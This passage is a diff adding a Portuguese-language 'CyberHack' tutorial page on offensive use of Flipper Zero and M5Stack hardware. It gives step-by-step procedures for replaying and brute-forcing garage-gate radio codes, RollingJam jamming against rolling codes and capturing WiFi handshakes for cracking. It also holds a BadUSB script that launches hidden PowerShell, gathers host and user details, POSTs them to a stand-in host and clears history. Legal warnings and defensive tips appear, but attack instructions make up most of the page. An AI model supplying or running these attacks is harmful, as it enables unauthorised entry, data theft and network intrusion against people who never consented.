+3. Adicione suas chaves ao arquivo no formato hex de 6 bytes (12 caracteres)
+4. Cada chave deve estar em uma linha separada
+5. Desconecte e use o novo dicionário para tentativas de ataque</pre>
+            </div>
+            
+            <p>Dicionários de chaves populares:</p>
+            <ul>
+                <li>Dicionário padrão do Flipper (inclui chaves comuns)</li>
+                <li>Extended dictionary (disponível em <a href="https://github.com/UberGuidoZ/Flipper/tree/main/NFC/mf_classic_dict" target="_blank">Repositório UberGuidoZ</a>)</li>
+                <li>Dicionário específico para cartões de transporte (disponível em fóruns de segurança)</li>
+            </ul>
+        </section>
+
+        <section id="subghz" class="content-section">
+            <h2>Sub-GHz (433/315MHz)</h2>
+            <p>O módulo Sub-GHz do Flipper Zero permite interagir com diversos dispositivos que operam nas frequências de 433MHz ou 315MHz, como controles remotos, portões de garagem, e sistemas de alarme.</p>
+            
+            <h3 id="subghz-captura">Captura de Sinais</h3>
+            <p>A captura de sinais é o primeiro passo para analisar dispositivos Sub-GHz.</p>
+            
+            <div class="code-block">
+                <pre>
+# Captura de sinais Sub-GHz no Flipper Zero
+
+1. Navegue para: Sub-GHz -> Read
+2. Escolha a frequência adequada (433.92MHz é a mais comum)
+3. Pressione o botão central para iniciar a captura
+4. Acione o controle remoto que deseja capturar
+5. O Flipper Zero exibirá informações sobre o sinal detectado
+6. Pressione o botão central novamente para salvar o sinal
+7. Dê um nome ao arquivo e confirme
+
+# Tipos de modulação que o Flipper pode capturar:
+- AM (Amplitude Modulation)
+- FM (Frequency Modulation)
+- Diversos protocolos como:
+  - Princeton
+  - CAME
+  - Nice FLO
+  - Keeloq
+  - Star Line
+  - Linear/Chamberlain
+  - e muitos outros</pre>
+            </div>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-lightbulb"></i> Dica Profissional</h4>
+                <p>Se estiver capturando um sinal não identificado pelo Flipper, use a opção "RAW" para capturar o sinal bruto. Isto permitirá reproduzir o sinal mesmo sem decodificar seu protocolo.</p>
+            </div>
+            
+            <h3 id="subghz-replay">Replay de Sinais</h3>
+            <p>Após capturar, o Flipper Zero pode reproduzir os sinais para testar a segurança do dispositivo.</p>
+            
+            <div class="code-block">
+                <pre>
+# Replay de sinais Sub-GHz no Flipper Zero
+
+1. Navegue para: Sub-GHz -> Saved
+2. Selecione o sinal que deseja reproduzir
+3. Escolha "Send" no menu
+4. O Flipper Zero transmitirá o sinal capturado
+5. Observe se o dispositivo original responde ao sinal
+
+# Para sinais com código fixo:
+- O replay funcionará diretamente na maioria dos casos
+
+# Para sinais com rolling code (código variável):
+- O replay simples pode não funcionar devido à proteção anti-replay
+- Neste caso, técnicas como RollingJam podem ser necessárias</pre>
+            </div>
+            
+            <h3 id="subghz-bruteforce">Brute Force de Códigos</h3>
+            <p>Para sistemas simples com código fixo, o Flipper Zero pode tentar várias combinações para encontrar o código correto.</p>
+            
+            <div class="code-block">
+                <pre>
+# Brute Force de códigos Sub-GHz no Flipper Zero
+
+1. Navegue para: Sub-GHz -> Tools -> Bruteforce
+2. Selecione o protocolo a ser atacado:
+   - Princeton
+   - CAME
+   - Chamberlain
+   - Linear
+   - Nice FLO
+   - Firefly
+3. Defina o número de bits do código (geralmente 12 ou 24)
+4. Escolha a frequência (normalmente 433.92MHz ou 315MHz)
+5. Inicie o ataque e o Flipper tentará várias combinações
+6. Quando o dispositivo responder, você pode salvar o código encontrado
+
+# Exemplo para portão Chamberlain:
+1. Selecione "Chamberlain" como protocolo
+2. Use 8 bits para códigos antigos, 12 bits para modelos mais recentes
+3. Frequência 390MHz (EUA) ou 433MHz (Europa)
+4. Inicie o ataque e observe o portão</pre>
+            </div>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> Aviso de Tempo</h4>
+                <p>Ataques de força bruta podem levar muito tempo, especialmente para sistemas com códigos longos. Para um sistema de 12 bits, existem 4.096 combinações possíveis. Para otimizar, tente determinar primeiro o número de bits e protocolo corretos.</p>
+            </div>
+            
+            <h3 id="subghz-rollingjam">Ataques de Rolling Jam</h3>
+            <p>Para sistemas com código variável (rolling code), o ataque de replay simples não funciona. O método RollingJam pode ser usado para interceptar e armazenar sinais válidos não utilizados.</p>
+            
+            <div class="code-block">
+                <pre>
+# Ataque RollingJam com Flipper Zero
+
+## Princípio do ataque:
+1. Capture e bloqueie o sinal original enviado pelo controle remoto
+2. Armazene este sinal (que ainda não foi recebido pelo receptor)
+3. Posteriormente, reproduza o sinal armazenado para acionar o dispositivo
+
+## No Flipper Zero (requer firmware personalizado):
+1. Navegue para: Sub-GHz -> Tools -> RollingJam
+2. Defina a frequência (433.92MHz comum para Europa, 315MHz para EUA)
+3. Escolha um nome para o arquivo de captura
+4. Inicie o modo de captura com o botão central
+5. Quando o controle remoto for acionado:
+   - O Flipper captura o sinal
+   - Transmite um sinal de interferência para bloquear a recepção
+   - Armazena o código original para uso posterior
+6. Repita o processo para capturar múltiplos códigos
+7. Reproduza os códigos capturados quando necessário
+
+## Limitações:
+- Nem todos os firmwares do Flipper incluem esta funcionalidade
+- A eficácia varia de acordo com o sistema alvo
+- Alguns sistemas modernos têm proteções adicionais contra este tipo de ataque</pre>
+            </div>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-lightbulb"></i> Configuração Avançada</h4>
+                <p>Para melhorar a eficácia do RollingJam, você pode usar uma antena externa conectada ao GPIO do Flipper Zero. Existem antenas de 433MHz ajustáveis que melhoram significativamente o alcance e a capacidade de bloquear sinais.</p>
+            </div>
+        </section>
+
+        <section id="ir" class="content-section">
+            <h2>Infrared (IR)</h2>
+            <p>O módulo IR do Flipper Zero permite interagir com dispositivos controlados por infravermelho, como TVs, aparelhos de ar condicionado, sistemas de som e projetores.</p>
+            
+            <h3 id="ir-captura">Captura de Sinais IR</h3>
+            <p>Assim como com sinais Sub-GHz, o primeiro passo é capturar os comandos IR dos controles remotos originais.</p>
+            
+            <div class="code-block">
+                <pre>
+# Captura de sinais IR no Flipper Zero
+
+1. Navegue para: Infrared -> Learn New Remote
+2. Dê um nome ao novo controle remoto (ex: "TV Samsung")
+3. Adicione um botão e nomeie-o (ex: "Power")
+4. Aponte o controle remoto original para a parte superior do Flipper Zero
+5. Pressione o botão que deseja capturar no controle original
+6. O Flipper indicará quando o sinal for capturado com sucesso
+7. Continue adicionando mais botões conforme necessário
+8. Ao finalizar, o controle será salvo automaticamente
+
+# Dicas para melhorar a captura:
+- Mantenha o controle original próximo ao receptor IR do Flipper (1-3cm)
+- Evite luz solar direta ou forte iluminação fluorescente durante a captura
+- Pressione brevemente o botão no controle original (0.5-1 segundo)
+- Se a captura falhar, tente ângulos diferentes ou distâncias variadas</pre>
+            </div>
+            
+            <p>Protocolos IR comuns suportados pelo Flipper Zero:</p>
+            <ul>
+                <li>NEC</li>
+                <li>Samsung</li>
+                <li>RC5/RC6 (Philips)</li>
+                <li>Sony SIRC</li>
+                <li>JVC</li>
+                <li>Mitsubishi</li>
+                <li>Sinais RAW (para protocolos não identificados automaticamente)</li>
+            </ul>
+            
+            <h3 id="ir-universais">Controles Universais</h3>
+            <p>O Flipper Zero inclui uma biblioteca de comandos IR para diversos dispositivos, permitindo controlar aparelhos sem a necessidade de capturar manualmente os sinais.</p>
+            
+            <div class="code-block">
+                <pre>
+# Usando controles universais no Flipper Zero
+
+1. Navegue para: Infrared -> Universal Remotes
+2. Escolha a categoria do dispositivo:
+   - TVs
+   - Audio (sistemas de som)
+   - Projectors
+   - AC (ar condicionado)
+   - Fans (ventiladores)
+3. Selecione a marca do dispositivo
+4. Navegue entre os botões disponíveis
+5. Pressione o botão central para enviar o comando IR
+
+# Adicionando controles universais personalizados:
+1. Conecte o Flipper Zero ao computador
+2. Navegue até a pasta /infrared/assets/
+3. Adicione novos arquivos .ir seguindo o formato dos existentes
+4. Os controles adicionados aparecerão na interface do Flipper</pre>
+            </div>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-lightbulb"></i> Dica para Pentesting</h4>
+                <p>O módulo IR pode ser usado para testes de segurança em ambientes corporativos. Muitos projetores, TVs e sistemas de conferência em salas de reunião podem ser controlados via IR, permitindo demonstrações de controle não autorizado durante avaliações de segurança física.</p>
+            </div>
+        </section>
+
+        <section id="badusb" class="content-section">
+            <h2>BadUSB</h2>
+            <p>O recurso BadUSB transforma o Flipper Zero em um dispositivo USB HID (Human Interface Device) que pode emular um teclado e executar comandos predefinidos em computadores conectados.</p>
+            
+            <h3 id="badusb-scripts">Scripts de Payload</h3>
+            <p>Os scripts BadUSB (também conhecidos como payloads Ducky) permitem automatizar sequências de teclas para realizar diversas ações.</p>
+            
+            <div class="code-block">
+                <pre>
+# Criando e usando scripts BadUSB no Flipper Zero
+
+1. Crie um arquivo com extensão .txt no diretório /badusb/ do cartão SD
+2. Edite o arquivo usando a sintaxe Ducky Script
+3. No Flipper Zero, navegue para: BadUSB -> seu_arquivo.txt
+4. Conecte o Flipper a uma porta USB de um computador
+5. Pressione o botão central para executar o script
+
+# Exemplo de script para Windows (abre o Prompt de Comando e obtém informações IP):
+REM Abre o prompt de comando
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+REM Executa comando ipconfig
+STRING ipconfig /all
+ENTER
+DELAY 3000
+REM Salva resultado em um arquivo
+STRING ipconfig /all > %TEMP%\ip_info.txt
+ENTER
+DELAY 500
+REM Abre o arquivo
+STRING notepad %TEMP%\ip_info.txt
+ENTER
+
+# Comandos básicos do Ducky Script:
+REM [comentário]             - Comentário (não executado)
+DELAY [milissegundos]        - Espera pelo tempo especificado
+STRING [texto]               - Digita o texto especificado
+ENTER                        - Pressiona a tecla Enter
+GUI [tecla]                  - Pressiona tecla Windows + [tecla]
+ALT [tecla]                  - Pressiona Alt + [tecla]
+CTRL [tecla]                 - Pressiona Ctrl + [tecla]
+SHIFT [tecla]                - Pressiona Shift + [tecla]</pre>
+            </div>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> Aviso Importante</h4>
+                <p>A funcionalidade BadUSB deve ser usada apenas em sistemas nos quais você tem permissão explícita para testar. O uso não autorizado para obter acesso ou exfiltrar dados é ilegal e antiético.</p>
+            </div>
+            
+            <h3 id="badusb-ataques">Ataques de Exfiltração</h3>
+            <p>Scripts mais avançados podem ser usados para demonstrar vulnerabilidades em sistemas não protegidos contra ataques BadUSB.</p>
+            
+            <div class="code-block">
+                <pre>
+# Exemplo de script BadUSB para demonstração de exfiltração de dados (Windows)
+# (Use apenas em sistemas com autorização explícita)
+
+REM Configuração: servidor onde serão enviados os dados
+DEFINE HOST example.com
+DEFINE PORT 80
+
+REM Abre PowerShell (com opções para evitar detecção)
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 2000
+
+REM Coleta informações básicas do sistema
+STRING $info = "Hostname: " + $env:COMPUTERNAME
+ENTER
+STRING $info += "`nUsername: " + $env:USERNAME
+ENTER
+STRING $info += "`nSystem: " + (Get-WmiObject -Class Win32_OperatingSystem).Caption
+ENTER
+
+REM Exemplo de exfiltração por HTTP (simulado)
+STRING $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($info))
+ENTER
+STRING Invoke-WebRequest -Uri "http://$HOST:$PORT/collect" -Method POST -Body $encoded -UseBasicParsing
+ENTER
+
+REM Limpa rastros
+STRING Clear-History
+ENTER
+STRING exit
+ENTER</pre>
+            </div>
+            
+            <p>Medidas de proteção contra ataques BadUSB:</p>
+            <ul>
+                <li>Utilizar bloqueadores USB (dispositivos que permitem apenas conexões de armazenamento, bloqueando HID)</li>
+                <li>Implementar políticas de controle de dispositivos no sistema operacional</li>
+                <li>Manter sistemas atualizados com patches de segurança</li>
+                <li>Usar autenticação de múltiplos fatores para acesso a sistemas críticos</li>
+                <li>Educar usuários sobre os riscos de conectar dispositivos USB desconhecidos</li>
+            </ul>
+        </section>
+
+        <section id="projetos" class="content-section">
+            <h2>Projetos Avançados</h2>
+            <p>Combinando o Flipper Zero, M5Stack e outros dispositivos, é possível criar projetos avançados para testes de segurança mais complexos.</p>
+            
+            <h3 id="projetos-wardriving">Wardriving Automatizado</h3>
+            <p>Wardriving é a prática de mapear redes WiFi em uma área geográfica. Combinando GPS com capacidades de escaneamento WiFi, é possível criar uma solução completa.</p>
+            
+            <div class="code-block">
+                <pre>
+# Projeto de Wardriving com M5Stack e módulo GPS
+
+#include <M5Stack.h>
+#include "WiFi.h"
+#include <TinyGPS++.h>
+#include <SD.h>
+
+TinyGPSPlus gps;
+HardwareSerial GPSSerial(2);  // Use UART2 para M5Stack
+File logFile;
+
+void setup() {
+  M5.begin();
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.setTextColor(WHITE);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.println("Wardriving Tool");
+  
+  // Inicializar GPS (conectado à porta UART2)
+  GPSSerial.begin(9600, SERIAL_8N1, 16, 17);  // RX, TX para Core
+  
+  // Inicializar cartão SD
+  if (!SD.begin()) {
+    M5.Lcd.println("Falha ao iniciar SD Card");
+    while (1);
+  }
+  
+  // Criar arquivo de log
+  String filename = "/wardriving_" + String(millis()) + ".csv";
+  logFile = SD.open(filename, FILE_WRITE);
+  if (logFile) {
+    logFile.println("MAC,SSID,RSSI,Channel,Encryption,Latitude,Longitude,Accuracy,Date,Time");
+    logFile.flush();
+  }
+  
+  // Configurar WiFi para escaneamento
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  
+  M5.Lcd.println("Sistema pronto");
+  M5.Lcd.println("A: Iniciar scan");
+  M5.Lcd.println("B: Parar scan");
+  M5.Lcd.println("C: Status");
+}
+
+bool scanning = false;
+int networksFound = 0;
+unsigned long lastScanTime = 0;
+double currentLat = 0, currentLng = 0;
+int satellitesConnected = 0;
+
+void loop() {
+  M5.update();
+  
+  // Ler dados do GPS
+  while (GPSSerial.available() > 0) {
+    gps.encode(GPSSerial.read());
+  }
+  
+  if (gps.location.isUpdated()) {
+    currentLat = gps.location.lat();
+    currentLng = gps.location.lng();
+    satellitesConnected = gps.satellites.value();
+  }
+  
+  if (M5.BtnA.wasPressed()) {
+    scanning = true;
+    M5.Lcd.fillRect(0, 150, 320, 90, BLACK);
+    M5.Lcd.setCursor(0, 150);
+    M5.Lcd.println("Escaneamento iniciado");
+  }
+  
+  if (M5.BtnB.wasPressed()) {
+    scanning = false;
+    M5.Lcd.fillRect(0, 150, 320, 90, BLACK);
+    M5.Lcd.setCursor(0, 150);
+    M5.Lcd.println("Escaneamento parado");
+    if (logFile) {
+      logFile.flush();
+    }
+  }
+  
+  if (M5.BtnC.wasPressed()) {
+    M5.Lcd.fillScreen(BLACK);
+    M5.Lcd.setCursor(0, 0);
+    M5.Lcd.println("Status do Sistema");
+    M5.Lcd.printf("Redes encontradas: %d\n", networksFound);
+    M5.Lcd.printf("GPS: %.6f, %.6f\n", currentLat, currentLng);
+    M5.Lcd.printf("Satélites: %d\n", satellitesConnected);
+    M5.Lcd.printf("Scanning: %s\n", scanning ? "Sim" : "Não");
+    delay(3000);
+    
+    M5.Lcd.fillScreen(BLACK);
+    M5.Lcd.setCursor(0, 0);
+    M5.Lcd.println("Wardriving Tool");
+    M5.Lcd.println("A: Iniciar scan");
+    M5.Lcd.println("B: Parar scan");
+    M5.Lcd.println("C: Status");
+    
+    if (scanning) {
+      M5.Lcd.setCursor(0, 150);
+      M5.Lcd.println("Escaneamento em andamento");
+    }
+  }
+  
+  // Realizar escaneamento a cada 30 segundos
+  if (scanning && (millis() - lastScanTime > 30000)) {
+    M5.Lcd.fillRect(0, 180, 320, 60, BLACK);
+    M5.Lcd.setCursor(0, 180);
+    M5.Lcd.println("Escaneando redes...");
+    
+    int numNetworks = WiFi.scanNetworks();
+    
+    if (numNetworks == 0) {
+      M5.Lcd.println("Nenhuma rede encontrada");
+    } else {
+      networksFound += numNetworks;
+      M5.Lcd.printf("Encontradas %d redes\n", numNetworks);
+      
+      // Salvar informações no arquivo CSV
+      if (logFile) {
+        for (int i = 0; i < numNetworks; i++) {
+          String encryptionType;
+          switch(WiFi.encryptionType(i)) {
+            case WIFI_AUTH_OPEN: encryptionType = "Open"; break;
+            case WIFI_AUTH_WEP: encryptionType = "WEP"; break;
+            case WIFI_AUTH_WPA_PSK: encryptionType = "WPA_PSK"; break;
+            case WIFI_AUTH_WPA2_PSK: encryptionType = "WPA2_PSK"; break;
+            case WIFI_AUTH_WPA_WPA2_PSK: encryptionType = "WPA_WPA2_PSK"; break;
+            case WIFI_AUTH_WPA2_ENTERPRISE: encryptionType = "WPA2_ENTERPRISE"; break;
+            default: encryptionType = "Unknown";
+          }
+          
+          logFile.print(WiFi.BSSIDstr(i)); logFile.print(",");
+          logFile.print("\""); logFile.print(WiFi.SSID(i)); logFile.print("\",");
+          logFile.print(WiFi.RSSI(i)); logFile.print(",");
+          logFile.print(WiFi.channel(i)); logFile.print(",");
+          logFile.print(encryptionType); logFile.print(",");
+          logFile.print(currentLat, 6); logFile.print(",");
+          logFile.print(currentLng, 6); logFile.print(",");
+          logFile.print(gps.hdop.hdop()); logFile.print(",");
+          logFile.print(gps.date.year()); logFile.print("-");
+          logFile.print(gps.date.month()); logFile.print("-");
+          logFile.print(gps.date.day()); logFile.print(",");
+          logFile.print(gps.time.hour()); logFile.print(":");
+          logFile.print(gps.time.minute()); logFile.print(":");
+          logFile.println(gps.time.second());
+        }
+        logFile.flush();
+      }
+    }
+    
+    lastScanTime = millis();
+  }
+}</pre>
+            </div>
+            
+            <p>Componentes necessários para o projeto:</p>
+            <ul>
+                <li>M5Stack Core (ou modelo equivalente)</li>
+                <li>Módulo GPS para M5Stack</li>
+                <li>Cartão microSD para armazenamento dos dados</li>
+                <li>Bateria externa para operação prolongada</li>
+            </ul>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-lightbulb"></i> Dica para Visualização</h4>
+                <p>Os dados coletados no formato CSV podem ser facilmente importados para ferramentas como Wigle.net ou Google Earth para visualização e análise geográfica das redes encontradas.</p>
+            </div>
+            
+            <h3 id="projetos-pwnagotchi">Integração com Pwnagotchi</h3>
+            <p>O Pwnagotchi é um dispositivo de captura de handshakes WiFi baseado em aprendizado por reforço. Integrando-o com o Flipper Zero, é possível expandir suas capacidades.</p>
+            
+            <div class="code-block">
+                <pre>
+# Integração Flipper Zero + Pwnagotchi
+
+## Configuração:
+1. Tenha um Pwnagotchi funcionando (Raspberry Pi Zero W + display e-paper)
+2. Configure o Pwnagotchi para operar em modo manual ou auto
+3. Conecte o Pwnagotchi ao Flipper Zero via USB (requer adaptador USB-OTG)
+
+## Transferência de Handshakes:
+1. Capture handshakes com o Pwnagotchi durante operação normal
+2. Conecte o Pwnagotchi ao computador no modo USB-Ethernet
+3. Acesse a interface web do Pwnagotchi (http://pwnagotchi.local:8080)
+4. Baixe os handshakes capturados (formato PCAP)
+5. Converta-os para formato Hashcat usando ferramentas como cap2hccapx
+6. Transfira os arquivos para o cartão SD do Flipper Zero
+7. Use o leitor de arquivo no Flipper para revisá-los ou exportá-los
+
+## Expansão com ESP32 (Marauder):
+1. Use o ESP32 Marauder com o Flipper Zero conforme descrito anteriormente
+2. Capture handshakes adicionais em formatos compatíveis
+3. Combine os dados do Pwnagotchi e do Marauder para uma cobertura mais ampla</pre>
+            </div>
+            
+            <h3 id="projetos-dronehacking">Drone Hacking</h3>
+            <p>Combinando as capacidades do Flipper Zero e M5Stack, é possível criar uma plataforma para teste de segurança de drones.</p>
+            
+            <div class="code-block">
+                <pre>
+# Projeto de Análise de Segurança de Drones
+
+## Componentes necessários:
+- Flipper Zero
+- M5Stack com módulo WiFi
+- Antena direcional (opcional, para maior alcance)
+
+## Etapas para análise:
+1. Escaneamento passivo:
+   - Use o M5Stack para escanear e identificar redes WiFi do drone
+   - Analise protocolos e frequências utilizadas (2.4GHz comum)
+   - Registre endereços MAC e forças de sinal
+
+2. Análise de protocolo:
+   - Capture pacotes de comunicação usando modo monitor no ESP32
+   - Identifique padrões de comunicação e comandos
+   - Verifique se a comunicação é criptografada
+
+3. Teste de controles RF:
+   - Alguns drones usam frequências Sub-GHz para controle remoto
+   - Use o Flipper Zero para analisar sinais em 433MHz ou 915MHz
+   - Capture e analise sinais de controle quando disponíveis
+
+4. Código de exemplo para escaneamento de drones (M5Stack):
+   
+
+// Muitos drones comerciais modernos usam protocolos criptografados
+
+#include <M5Stack.h>
+#include "WiFi.h"
+#include "esp_wifi.h"
+
+
+const char* droneSSIDs[] = {
+  "DJI_", "Parrot_", "TELLO-", "Bebop_", "ANAFI_"
+};
+
+void setup() {
+  M5.begin();
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setCursor(0, 0);
+  M5.Lcd.setTextColor(WHITE);
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.println("Drone Scanner");
+  
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(100);
+  
+  M5.Lcd.println("Pronto para escanear");
+  M5.Lcd.println("Pressione A para iniciar");
+}
+
+void loop() {
+  M5.update();
+  
+  if (M5.BtnA.wasPressed()) {
+    M5.Lcd.fillScreen(BLACK);
+    M5.Lcd.setCursor(0, 0);
+    M5.Lcd.println("Escaneando drones...");
+    
+    int networks = WiFi.scanNetworks();
+    int dronesFound = 0;
+    
+    if (networks == 0) {
+      M5.Lcd.println("Nenhuma rede encontrada");
+    } else {
+      for (int i = 0; i < networks; i++) {
+        String ssid = WiFi.SSID(i);
+        bool isDrone = false;
+        
+        // Verificar se é uma rede de drone conhecida
+        for (int j = 0; j < sizeof(droneSSIDs)/sizeof(droneSSIDs[0]); j++) {
+          if (ssid.startsWith(droneSSIDs[j])) {
+            isDrone = true;
+            break;
+          }
+        }
+        
+        if (isDrone) {
+          dronesFound++;
+          M5.Lcd.printf("Drone: %s\n", ssid.c_str());
+          M5.Lcd.printf("  RSSI: %d dBm\n", WiFi.RSSI(i));
+          M5.Lcd.printf("  Canal: %d\n", WiFi.channel(i));
+          M5.Lcd.printf("  MAC: %s\n", WiFi.BSSIDstr(i).c_str());
+          M5.Lcd.println();
+        }
+      }
+      
+      M5.Lcd.printf("Total: %d drones\n", dronesFound);
+    }
+    
+    WiFi.scanDelete();
+  }
+}</pre>
+            </div>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> Aviso Legal</h4>
+                <p>A interferência em sistemas de drones sem permissão é ilegal na maioria dos países e pode ser extremamente perigosa. Esses conceitos são apresentados apenas para fins educacionais e de pesquisa em segurança. Sempre teste apenas em seus próprios dispositivos ou com permissão explícita.</p>
+            </div>
+        </section>
+
+        <section id="firmware" class="content-section">
+            <h2>Firmwares e Downloads</h2>
+            <p>Aqui estão os links para os principais firmwares e recursos para Flipper Zero e M5Stack. Firmwares personalizados podem desbloquear recursos adicionais e melhorar a funcionalidade dos dispositivos.</p>
+            
+            <h3>Firmwares para Flipper Zero</h3>
+            <div class="firmware-grid">
+                <div class="firmware-card">
+                    <h4>Firmware Oficial</h4>
+                    <p>Versão oficial mantida pela equipe do Flipper Zero. Recebe atualizações regulares e é mais estável.</p>
+                    <a href="https://github.com/flipperdevices/flipperzero-firmware" class="firmware-btn" target="_blank">Download</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>Unleashed Firmware</h4>
+                    <p>Remove limitações regionais de frequência e adiciona recursos avançados para Sub-GHz e RFID.</p>
+                    <a href="https://github.com/DarkFlippers/unleashed-firmware" class="firmware-btn" target="_blank">Download</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>RogueMaster</h4>
+                    <p>Inclui aplicativos adicionais, jogos, personalizações da interface e recursos experimentais.</p>
+                    <a href="https://github.com/RogueMaster/flipperzero-firmware-wPlugins" class="firmware-btn" target="_blank">Download</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>Xtreme Firmware</h4>
+                    <p>Combinação de recursos do Unleashed e RogueMaster com interface personalizável e melhorias estéticas.</p>
+                    <a href="https://github.com/Flipper-XFW/Xtreme-Firmware" class="firmware-btn" target="_blank">Download</a>
+                </div>
+            </div>
+            
+            <h3>Firmwares e Aplicações para M5Stack</h3>
+            <div class="firmware-grid">
+                <div class="firmware-card">
+                    <h4>ESP32 Marauder</h4>
+                    <p>Suite de ferramentas para pentesting WiFi e Bluetooth compatível com M5Stack e Flipper Zero.</p>
+                    <a href="https://github.com/justcallmekoko/ESP32Marauder" class="firmware-btn" target="_blank">Download</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>PacketMonitor32</h4>
+                    <p>Analisador de pacotes WiFi com visualização em tempo real para dispositivos ESP32/M5Stack.</p>
+                    <a href="https://github.com/spacehuhn/PacketMonitor32" class="firmware-btn" target="_blank">Download</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>M5Stack-SD-Updater</h4>
+                    <p>Permite carregar múltiplas aplicações no M5Stack a partir do cartão SD sem reprogramação.</p>
+                    <a href="https://github.com/tobozo/M5Stack-SD-Updater" class="firmware-btn" target="_blank">Download</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>UIFlow</h4>
+                    <p>Ambiente de programação baseado em blocos e MicroPython para dispositivos M5Stack.</p>
+                    <a href="https://flow.m5stack.com/" class="firmware-btn" target="_blank">Acessar</a>
+                </div>
+            </div>
+            
+            <h3>Recursos Adicionais</h3>
+            <div class="firmware-grid">
+                <div class="firmware-card">
+                    <h4>Flipper Zero Playground</h4>
+                    <p>Coleção de recursos, aplicativos e exemplos de código para Flipper Zero.</p>
+                    <a href="https://github.com/UberGuidoZ/Flipper" class="firmware-btn" target="_blank">Acessar</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>Awesome Flipper Zero</h4>
+                    <p>Lista curada de recursos, tutoriais e ferramentas para o Flipper Zero.</p>
+                    <a href="https://github.com/djsime1/awesome-flipperzero" class="firmware-btn" target="_blank">Acessar</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>M5Burner</h4>
+                    <p>Utilitário oficial para flashear firmwares nos dispositivos M5Stack.</p>
+                    <a href="https://docs.m5stack.com/en/download" class="firmware-btn" target="_blank">Download</a>
+                </div>
+                
+                <div class="firmware-card">
+                    <h4>qFlipper</h4>
+                    <p>Aplicativo desktop oficial para atualizar e gerenciar o Flipper Zero.</p>
+                    <a href="https://flipperzero.one/update" class="firmware-btn" target="_blank">Download</a>
+                </div>
+            </div>
+        </section>
+
+        <section id="legal" class="content-section">
+            <h2>Considerações Legais e Éticas</h2>
+            <p>O uso responsável destas ferramentas é essencial. Antes de utilizar o Flipper Zero, M5Stack ou qualquer dispositivo similar para testes de segurança, considere os seguintes pontos:</p>
+            
+            <div class="warning-box">
+                <h4><i class="fas fa-gavel"></i> Aspectos Legais</h4>
+                <ul>
+                    <li><strong>Teste apenas em sistemas próprios ou com autorização explícita</strong> - Testar sistemas sem permissão é ilegal na maioria dos países</li>
+                    <li><strong>Interferência em frequências de rádio</strong> - Dispositivos Sub-GHz e WiFi estão sujeitos a regulamentações específicas em cada país</li>
+                    <li><strong>Clonagem de credenciais de acesso</strong> - A clonagem não autorizada de cartões de acesso pode violar leis criminais</li>
+                    <li><strong>Interrupção de serviços</strong> - Ataques de jamming ou deauth podem ser considerados sabotagem ou interferência ilegal</li>
+                </ul>
+            </div>
+            
+            <h3>Diretrizes Éticas para Pentesting</h3>
+            <ol>
+                <li><strong>Obtenha autorização por escrito</strong> antes de realizar qualquer teste de segurança</li>
+                <li><strong>Defina o escopo claramente</strong> - quais sistemas podem ser testados e quais técnicas podem ser utilizadas</li>
+                <li><strong>Evite interrupções de serviço</strong> - considere o impacto de suas ações em sistemas em produção</li>
+                <li><strong>Documente suas ações</strong> - mantenha registros detalhados de todos os testes realizados</li>
+                <li><strong>Proteja dados sensíveis</strong> - se encontrar informações confidenciais, trate-as com responsabilidade</li>
+                <li><strong>Reporte vulnerabilidades responsavelmente</strong> - siga práticas de divulgação coordenada</li>
+                <li><strong>Respeite a privacidade</strong> - não capture ou analise dados pessoais sem necessidade</li>
+            </ol>
+            
+            <h3>Uso Educacional e de Pesquisa</h3>
+            <p>Para uso educacional e de pesquisa em segurança, considere estas práticas:</p>
+            <ul>
+                <li>Crie ambientes de laboratório isolados para testes</li>
+                <li>Use dispositivos e redes dedicadas que não afetem sistemas de produção</li>
+                <li>Documente seus experimentos e compartilhe conhecimento de forma responsável</li>
+                <li>Colabore com comunidades de segurança para melhorar ferramentas e técnicas</li>
+                <li>Contribua com correções e melhorias para os projetos de código aberto</li>
+            </ul>
+            
+            <div class="tip-box">
+                <h4><i class="fas fa-shield-alt"></i> Enfoque Construtivo</h4>
+                <p>Lembre-se que o objetivo principal destas ferramentas é melhorar a segurança, não comprometê-la. Use suas habilidades e conhecimentos para identificar vulnerabilidades que possam ser corrigidas, tornando os sistemas mais seguros para todos.</p>
+            </div>
+        </section>
+        
+        <a href="#" class="back-to-top" id="backToTop"><i class="fas fa-arrow-up"></i></a>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-logo">CyberHack</div>
+                <div class="footer-links">
+                    <a href="#">Termos de Uso</a>
+                    <a href="#">Política de Privacidade</a>
+                    <a href="#">FAQ</a>
+                    <a href="contato.html">Contato</a>
+                </div>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-discord"></i></a>
+                    <a href="#"><i class="fab fa-github"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+    <div class="digital-numbers">ID: <span id="random-numbers">29384756</span></div>
+
+    <script>
+        // Inicialização do canvas de fundo
+        const canvas = document.getElementById('canvas');
